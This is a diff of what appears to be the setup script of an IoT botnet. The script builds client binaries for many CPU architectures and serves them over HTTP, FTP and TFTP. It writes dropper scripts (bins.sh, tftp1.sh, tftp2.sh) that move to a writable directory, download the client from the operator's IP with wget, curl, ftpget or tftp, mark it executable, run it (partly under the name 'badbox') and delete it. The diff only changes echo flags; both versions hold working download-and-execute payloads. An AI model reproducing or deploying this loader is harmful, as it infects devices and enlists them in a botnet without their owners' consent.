@@ -115,20 +115,20 @@ for arch in rust_archs:
     run(f"mv {binary_path} /var/lib/tftpboot/{binary_name}")
 
 
-run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
-run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
-run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
-run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
-run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
-run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
-run('echo -e "#!/bin/bash" > /var/www/html/bins.sh')
+run('echo "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
+run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
+run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
+run('echo "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
+run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
+run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
+run('echo "#!/bin/bash" > /var/www/html/bins.sh')
 
 for arch in rust_archs:
     i = "client-" + arch
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
 
 run("chmod 777 /var/www/html/bins.sh")
 
